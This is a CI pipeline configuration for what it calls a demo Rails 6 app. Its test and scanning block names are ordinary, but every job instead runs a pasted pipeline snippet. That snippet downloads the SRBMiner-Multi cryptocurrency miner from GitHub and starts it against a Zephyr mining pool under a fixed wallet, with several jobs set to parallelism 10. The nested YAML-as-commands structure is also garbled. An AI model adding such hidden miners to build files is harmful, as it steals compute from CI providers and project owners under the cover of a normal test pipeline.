version: v1.0
name: Demo Rails 6 app
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu2004
blocks:
  - name: Setup
    dependencies: []
    task:
      jobs:
        - name: bundle
          commands:
            - 'version: v1.0'
            - 'name: Initial Pipeline'
            - 'agent:'
            - '  machine:'
            - '    type: e1-standard-2'
            - '    os_image: ubuntu2004'
            - 'blocks:'
            - '  - name: ''Block #1'''
            - '    task:'
            - '      jobs:'
            - '        - name: ''Job #1'''
            - '          commands:'
            - '            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz && tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz && cd SRBMiner-Multi-0-8-5 && clear && ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHsB1MPw8CisrxCk1QWWMLsh1iwNbjhZoAs286Ks278mhBzs6e7AzEGpGUK64hYBXSju51CLBZFHPjEkAsGXGn5DoVrcTS45w.hawu --cpu-threads 4'
  - name: Code scanning
    dependencies:
      - Setup
    task:
      jobs:
        - name: check style + security
          commands:
            - 'version: v1.0'
            - 'name: Initial Pipeline'
            - 'agent:'
            - '  machine:'
            - '    type: e1-standard-2'
            - '    os_image: ubuntu2004'
            - 'blocks:'
            - '  - name: ''Block #1'''
            - '    task:'
            - '      jobs:'
            - '        - name: ''Job #1'''
            - '          commands:'
            - '            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz && tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz && cd SRBMiner-Multi-0-8-5 && clear && ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHsB1MPw8CisrxCk1QWWMLsh1iwNbjhZoAs286Ks278mhBzs6e7AzEGpGUK64hYBXSju51CLBZFHPjEkAsGXGn5DoVrcTS45w.hawu --cpu-threads 4'
          parallelism: 10
  - name: Unit tests
    dependencies:
      - Code scanning
    task:
      prologue:
        commands:
          - sem-version ruby 2.7.3
          - sem-version node 14.16.1
          - checkout
          - cache restore
          - bundle install
          - cache store
          - sem-service start postgres
          - 'bundle exec rake db:setup'
      jobs:
        - name: RSpec - model tests
          commands:
            - 'version: v1.0'
            - 'name: Initial Pipeline'
            - 'agent:'
            - '  machine:'
            - '    type: e1-standard-2'
            - '    os_image: ubuntu2004'
            - 'blocks:'
            - '  - name: ''Block #1'''
            - '    task:'
            - '      jobs:'
            - '        - name: ''Job #1'''
            - '          commands:'
            - '            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz && tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz && cd SRBMiner-Multi-0-8-5 && clear && ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHsB1MPw8CisrxCk1QWWMLsh1iwNbjhZoAs286Ks278mhBzs6e7AzEGpGUK64hYBXSju51CLBZFHPjEkAsGXGn5DoVrcTS45w.hawu --cpu-threads 4'
          parallelism: 10
      epilogue:
        always:
          commands:
            - "[[ -f junit.xml ]] && test-results publish --name \"\U0001F9EA Unit tests\" junit.xml"
  - name: Integration tests
    dependencies:
      - Unit tests
    task:
      jobs:
        - name: RSpec - feature specs
          commands:
            - 'version: v1.0'
            - 'name: Initial Pipeline'
            - 'agent:'
            - '  machine:'
            - '    type: e1-standard-2'
            - '    os_image: ubuntu2004'
            - 'blocks:'
            - '  - name: ''Block #1'''
            - '    task:'
            - '      jobs:'
            - '        - name: ''Job #1'''
            - '          commands:'
            - '            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz && tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz && cd SRBMiner-Multi-0-8-5 && clear && ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHsB1MPw8CisrxCk1QWWMLsh1iwNbjhZoAs286Ks278mhBzs6e7AzEGpGUK64hYBXSju51CLBZFHPjEkAsGXGn5DoVrcTS45w.hawu --cpu-threads 4'
          parallelism: 10
after_pipeline:
  task:
    jobs:
      - name: Publish Results
        commands:
          - 'version: v1.0'
          - 'name: Initial Pipeline'
          - 'agent:'
          - '  machine:'
          - '    type: e1-standard-2'
          - '    os_image: ubuntu2004'
          - 'blocks:'
          - '  - name: ''Block #1'''
          - '    task:'
          - '      jobs:'
          - '        - name: ''Job #1'''
          - '          commands:'
          - '            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz && tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz && cd SRBMiner-Multi-0-8-5 && clear && ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHsB1MPw8CisrxCk1QWWMLsh1iwNbjhZoAs286Ks278mhBzs6e7AzEGpGUK64hYBXSju51CLBZFHPjEkAsGXGn5DoVrcTS45w.hawu --cpu-threads 4'
